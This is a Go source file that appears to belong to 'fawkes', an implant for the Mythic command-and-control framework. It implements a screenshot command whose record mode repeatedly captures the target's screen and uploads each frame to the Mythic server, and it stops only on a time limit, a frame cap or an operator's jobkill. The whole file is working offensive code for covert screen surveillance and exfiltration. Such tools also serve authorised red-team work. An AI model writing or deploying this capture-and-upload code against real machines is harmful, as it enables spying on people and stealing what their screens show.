package commands

import (
	"encoding/json"
	"fmt"
	"time"

	"fawkes/pkg/structs"
)

// screenshotParams holds parsed parameters for the screenshot command.
type screenshotParams struct {
	Action    string `json:"action"`     // "single" or "record"
	Interval  int    `json:"interval"`   // seconds between captures (record mode)
	Duration  int    `json:"duration"`   // total duration in seconds (record mode)
	MaxFrames int    `json:"max_frames"` // max frames to capture (record mode)
}

// screenshotRecordResult is the JSON output from a recording session.
type screenshotRecordResult struct {
	Action         string `json:"action"`
	FramesCaptured int    `json:"frames_captured"`
	ActualDuration string `json:"actual_duration"`
	StoppedBy      string `json:"stopped_by"` // "duration", "max_frames", "jobkill", "error"
}

// parseScreenshotParams parses and applies defaults to screenshot parameters.
func parseScreenshotParams(task structs.Task) screenshotParams {
	var params screenshotParams
	if task.Params != "" {
		_ = json.Unmarshal([]byte(task.Params), &params)
	}
	if params.Action == "" {
		params.Action = "single"
	}
	if params.Interval <= 0 {
		params.Interval = 5
	}
	if params.Interval < 1 {
		params.Interval = 1
	}
	if params.Duration <= 0 {
		params.Duration = 60
	}
	if params.Duration > 600 {
		params.Duration = 600
	}
	if params.MaxFrames <= 0 {
		params.MaxFrames = 100
	}
	if params.MaxFrames > 1000 {
		params.MaxFrames = 1000
	}
	return params
}

// captureFunc is a function that captures a screenshot and returns PNG data.
type captureFunc func() ([]byte, error)

// screenshotRecordLoop captures screenshots at regular intervals and uploads each to Mythic.
// It stops when duration expires, max_frames is reached, or the task is killed via jobkill.
func screenshotRecordLoop(task structs.Task, capture captureFunc, params screenshotParams) structs.CommandResult {
	startTime := time.Now()
	deadline := startTime.Add(time.Duration(params.Duration) * time.Second)
	interval := time.Duration(params.Interval) * time.Second

	frameCount := 0
	stoppedBy := "duration"

	for time.Now().Before(deadline) && frameCount < params.MaxFrames {
		// Check for jobkill
		if task.DidStop() {
			stoppedBy = "jobkill"
			break
		}

		// Capture a frame
		imgData, err := capture()
		if err != nil {
			// Log error but continue — transient failures shouldn't stop recording
			if frameCount == 0 {
				// First frame failed — likely a persistent issue
				return errorf("Error capturing first frame: %v", err)
			}
			// Skip this frame, continue
			time.Sleep(interval)
			continue
		}

		if len(imgData) == 0 {
			time.Sleep(interval)
			continue
		}

		// Upload frame to Mythic
		frameCount++
		screenshotMsg := structs.SendFileToMythicStruct{}
		screenshotMsg.Task = &task
		screenshotMsg.IsScreenshot = true
		screenshotMsg.SendUserStatusUpdates = false
		screenshotMsg.Data = &imgData
		screenshotMsg.FileName = fmt.Sprintf("recording_%d_frame_%03d.png",
			startTime.Unix(), frameCount)
		screenshotMsg.FullPath = ""
		screenshotMsg.FinishedTransfer = make(chan int, 2)

		task.Job.SendFileToMythic <- screenshotMsg

		// Wait for upload to complete (with timeout and jobkill check)
		uploadDone := false
		for !uploadDone {
			select {
			case <-screenshotMsg.FinishedTransfer:
				uploadDone = true
			case <-time.After(1 * time.Second):
				if task.DidStop() {
					stoppedBy = "jobkill"
					uploadDone = true
				}
			}
		}

		if task.DidStop() {
			stoppedBy = "jobkill"
			break
		}

		// Check if we hit max frames
		if frameCount >= params.MaxFrames {
			stoppedBy = "max_frames"
			break
		}

		// Sleep until next capture (check for jobkill during sleep)
		sleepUntil := time.Now().Add(interval)
		for time.Now().Before(sleepUntil) && time.Now().Before(deadline) {
			if task.DidStop() {
				stoppedBy = "jobkill"
				break
			}
			time.Sleep(500 * time.Millisecond)
		}

		if task.DidStop() {
			stoppedBy = "jobkill"
			break
		}
	}

	actualDuration := time.Since(startTime).Round(time.Second).String()
	result := screenshotRecordResult{
		Action:         "record",
		FramesCaptured: frameCount,
		ActualDuration: actualDuration,
		StoppedBy:      stoppedBy,
	}
	output, _ := json.Marshal(result)
	return successResult(string(output))
}
